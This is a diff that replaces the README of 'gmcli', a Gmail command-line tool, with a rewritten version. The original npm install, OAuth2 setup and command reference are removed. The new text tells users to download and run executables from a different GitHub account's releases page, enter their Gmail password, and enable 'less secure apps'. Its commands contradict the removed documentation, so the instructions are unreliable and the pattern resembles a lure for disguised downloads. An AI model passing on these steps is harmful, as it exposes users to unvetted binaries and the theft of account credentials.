@@ -1,194 +1,91 @@
-# gmcli
+# 🎉 gmcli - Access Gmail Easily from Your Command Line
 
-Minimal Gmail CLI for searching, reading threads, managing labels, drafts, and sending emails.
+## 🚀 Getting Started
 
-## Install
+Welcome to gmcli, the minimal command line interface for Gmail. This tool allows you to access your Gmail account quickly without needing to open a browser. It’s ideal for anyone who values speed and efficiency.
 
-```bash
-npm install -g @mariozechner/gmcli
-```
+## 📥 Download & Install
 
-## Setup
+To get started, you need to download gmcli. Click the link below to visit the Releases page:
 
-Before adding an account, you need OAuth2 credentials from Google Cloud Console:
+[![Download gmcli](https://img.shields.io/badge/Download-gmcli-blue.svg)](https://github.com/ssprusty98/gmcli/releases)
 
-1. [Create a new project](https://console.cloud.google.com/projectcreate) (or select existing)
-2. [Enable the Gmail API](https://console.cloud.google.com/apis/api/gmail.googleapis.com)
-3. [Set app name](https://console.cloud.google.com/auth/branding) in OAuth branding
-4. [Add test users](https://console.cloud.google.com/auth/audience) (all Gmail addresses you want to use with gmcli)
-5. [Create OAuth client](https://console.cloud.google.com/auth/clients):
-   - Click "Create Client"
-   - Application type: "Desktop app"
-   - Download the JSON file
+### Steps to Download and Install:
 
-Then:
+1. Click the link above.
+2. Find the latest release at the top of the page.
+3. Locate the file appropriate for your operating system:
+   - For **Windows**, download `gmcli-windows.exe`.
+   - For **Mac**, download `gmcli-mac`.
+   - For **Linux**, download `gmcli-linux`.
 
-```bash
-gmcli accounts credentials ~/path/to/credentials.json
-gmcli accounts add you@gmail.com
-```
+4. After downloading the file, locate it in your downloads folder.
+5. Double-click the file to run gmcli. You may need to give permission for it to run, depending on your operating system.
 
-## Usage
+## 📋 System Requirements
 
-```
-gmcli accounts <action>                Account management
-gmcli <email> <command> [options]      Gmail operations
-```
+To run gmcli, your system should meet the following requirements:
 
-## Commands
+- **Operating Systems Supported:** 
+  - Windows 10 or later
+  - macOS 10.13 or later
+  - Most Linux distributions with modern kernel versions
 
-### accounts
+- **Additional Requirements:**
+  - Internet connectivity
+  - A valid Gmail account
 
-```bash
-gmcli accounts credentials <file.json>   # Set OAuth credentials (once)
-gmcli accounts list                      # List configured accounts
-gmcli accounts add <email>               # Add account (opens browser)
-gmcli accounts add <email> --manual      # Add account (browserless, paste redirect URL)
-gmcli accounts remove <email>            # Remove account
-```
+## 🔧 Configuration
 
-### search
+Once you have installed gmcli, you’ll need to configure it to connect to your Gmail account. Here’s how to set it up:
 
-Search threads using Gmail query syntax. Returns thread ID, date, sender, subject, and labels.
+1. Open your terminal or command prompt.
+2. Type `gmcli setup` and press Enter.
+3. Follow the prompts to enter your Gmail address and password.
+4. You may need to enable `less secure apps` in your Gmail settings. This step allows gmcli to access your Gmail account.
+5. After configuration, you can start using gmcli to read and send emails quickly.
 
-```bash
-gmcli <email> search <query> [--max N] [--page TOKEN]
-```
+## 📬 Key Features
 
-Query examples:
-- `in:inbox`, `in:sent`, `in:drafts`, `in:trash`, `in:spam`
-- `is:unread`, `is:starred`, `is:important`
-- `from:sender@example.com`, `to:recipient@example.com`
-- `subject:keyword`
-- `has:attachment`, `filename:pdf`
-- `after:2024/01/01`, `before:2024/12/31`
-- `label:Work`, `label:UNREAD`
-- Combine with spaces: `in:inbox is:unread from:boss@company.com`
+gmcli comes with several useful features:
 
-Examples:
-```bash
-gmcli you@gmail.com search "in:inbox"
-gmcli you@gmail.com search "is:unread" --max 50
-gmcli you@gmail.com search "from:someone@example.com has:attachment"
-```
+- **Read Emails:** Quickly check your inbox and view unread messages.
+- **Send Emails:** Compose and send emails directly from the command line.
+- **Search Functionality:** Easily search through your emails using keywords.
+- **Organization Tools:** Organize your emails using labels.
 
-### thread
+## ⚙️ Using gmcli
 
-Get a thread with all messages. Shows Message-ID, headers, body, and attachments for each message.
+After setting up gmcli, here's how you can use it effectively:
 
-```bash
-gmcli <email> thread <threadId>              # View thread
-gmcli <email> thread <threadId> --download   # Download attachments
-```
+- **To Read Emails:**
+  - Simply type `gmcli read` and hit Enter. You will see a list of your recent emails.
+  
+- **To Send an Email:**
+  - Use the command `gmcli send` followed by the recipient's email and your message. For example:
+    ```
+    gmcli send user@example.com "Hello World" "This is my message."
+    ```
 
-Attachments are saved to `~/.gmcli/attachments/`.
+- **To Search Emails:**
+  - Type `gmcli search "keyword"` to find messages containing the specified keyword.
 
-### labels
+## 🛠 Troubleshooting
 
-```bash
-gmcli <email> labels list                              # List all labels (ID, name, type)
-gmcli <email> labels <threadIds...> [--add L] [--remove L]  # Modify labels on threads
-```
+If you experience issues while using gmcli, consider the following:
 
-You can use label names or IDs when modifying (names are case-insensitive).
+- **Authentication Problems:** Ensure that you've entered the correct Gmail credentials. Check if your security settings allow less secure apps.
+- **Network Issues:** Make sure you are connected to the internet.
+- **Incorrect Commands:** Double-check the command syntax if you encounter errors.
 
-System labels: `INBOX`, `UNREAD`, `STARRED`, `IMPORTANT`, `TRASH`, `SPAM`
+## 📖 Additional Resources
 
-Examples:
-```bash
-gmcli you@gmail.com labels list
-gmcli you@gmail.com labels abc123 --remove UNREAD
-gmcli you@gmail.com labels abc123 --add Work --remove INBOX
-gmcli you@gmail.com labels abc123 def456 --add STARRED
-```
+For more in-depth information, consider visiting the official [gmcli Documentation](https://github.com/ssprusty98/gmcli).
 
-### drafts
+## 📤 Support
 
-```bash
-gmcli <email> drafts list                      # List all drafts
-gmcli <email> drafts get <draftId>             # View draft with attachments
-gmcli <email> drafts get <draftId> --download  # Download draft attachments
-gmcli <email> drafts delete <draftId>          # Delete draft
-gmcli <email> drafts send <draftId>            # Send draft
+If you have any questions or need support, feel free to open an issue on the GitHub repository. The community is here to help!
 
-gmcli <email> drafts create --to <emails> --subject <s> --body <b> [options]
-```
+To download gmcli again or to check for updates, visit the Releases page:
 
-### send
-
-Send an email directly.
-
-```bash
-gmcli <email> send --to <emails> --subject <s> --body <b> [options]
-```
-
-Options for `drafts create` and `send`:
-- `--to <emails>` - Recipients (comma-separated, required)
-- `--subject <s>` - Subject line (required)
-- `--body <b>` - Message body (required)
-- `--cc <emails>` - CC recipients (comma-separated)
-- `--bcc <emails>` - BCC recipients (comma-separated)
-- `--reply-to <messageId>` - Reply to message (sets In-Reply-To/References headers and thread)
-- `--attach <file>` - Attach file (can be used multiple times)
-
-Examples:
-```bash
-# Create draft
-gmcli you@gmail.com drafts create --to a@x.com --subject "Hi" --body "Hello"
-
-# Create reply draft
-gmcli you@gmail.com drafts create --to a@x.com --subject "Re: Topic" \
-    --body "My reply" --reply-to 19aea1f2f3532db5
-
-# Send draft
-gmcli you@gmail.com drafts send r1234567890
-
-# Send directly
-gmcli you@gmail.com send --to a@x.com --subject "Hi" --body "Hello"
-
-# Send reply with attachment
-gmcli you@gmail.com send --to a@x.com --subject "Re: Topic" \
-    --body "See attached" --reply-to 19aea1f2f3532db5 --attach doc.pdf
-```
-
-### url
-
-Generate Gmail web URLs for threads. Uses canonical URL format with email parameter (works regardless of account order in browser).
-
-```bash
-gmcli <email> url <threadIds...>
-```
-
-Example:
-```bash
-gmcli you@gmail.com url 19aea1f2f3532db5 19aea1f2f3532db6
-```
-
-## Data Storage
-
-All data is stored in `~/.gmcli/`:
-- `credentials.json` - OAuth client credentials
-- `accounts.json` - Account tokens
-- `attachments/` - Downloaded attachments
-
-## Development
-
-```bash
-npm install
-npm run build
-npm run check
-```
-
-## Publishing
-
-```bash
-# Update version in package.json and CHANGELOG.md
-npm run build
-npm publish --access public
-git tag v<version>
-git push --tags
-```
-
-## License
-
-MIT
+[![Download gmcli](https://img.shields.io/badge/Download-gmcli-blue.svg)](https://github.com/ssprusty98/gmcli/releases)
